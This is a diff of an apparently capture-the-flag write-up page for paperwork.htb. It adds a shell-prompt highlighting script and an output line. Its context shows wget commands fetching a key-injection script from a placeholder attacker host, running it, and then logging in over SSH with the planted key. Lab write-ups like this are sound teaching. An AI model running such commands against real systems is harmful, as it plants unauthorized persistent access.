@@ -9,6 +9,13 @@
   <link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="../css/style.css">
 </head>
+
+<script>
+  document.querySelectorAll('pre code').forEach(block => {
+    block.innerHTML = block.innerHTML.replace(/^(\$ |# ).*/gm, '<span class="command">$&</span>');
+  });
+</script>
+
 <body>
   <header>
     <div class="header-inner">
@@ -158,7 +165,8 @@ print("[+] SSH Key injected!")</code></pre>
       <pre><code>cd /tmp
 wget http://&lt;attacker-ip&gt;:8000/id_rsa_archivist.pub
 wget http://&lt;attacker-ip&gt;:8000/putsshkey.py
-python3 putsshkey.py</code></pre>
+python3 putsshkey.py
+# [+] SSH Key injected!</code></pre>
       
       <p><strong>Back on attacker machine:</strong></p>
       <pre><code>ssh -i id_rsa_archivist archivist@paperwork.htb
